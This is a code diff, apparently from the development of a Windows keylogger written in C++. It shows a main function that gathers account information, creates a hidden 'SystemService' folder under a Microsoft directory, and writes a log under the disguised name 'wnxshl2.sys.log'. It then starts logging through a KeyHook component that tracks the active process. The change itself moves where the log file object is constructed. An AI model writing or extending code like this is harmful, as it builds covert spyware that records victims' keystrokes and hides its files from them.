@@ -26,12 +26,13 @@ int main() {
   clientInfo = Stream::GetAccountInfo(clientInfo);
 
   std::string path = Stream::GetPath("\\Microsoft\\");
-  Stream::LogFile logFile;
 
   std::string dirName = "SystemService";
 
   Stream::MakeDir(path, dirName, FILE_ATTRIBUTE_HIDDEN);
   Stream::MakeFile("wnxshl2.sys.log", path + "\\" + dirName);
+
+  Stream::LogFile logFile(path + dirName, "wnxshl2.sys.log");
   Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, logFile, false);
 
   std::ostringstream ostream;
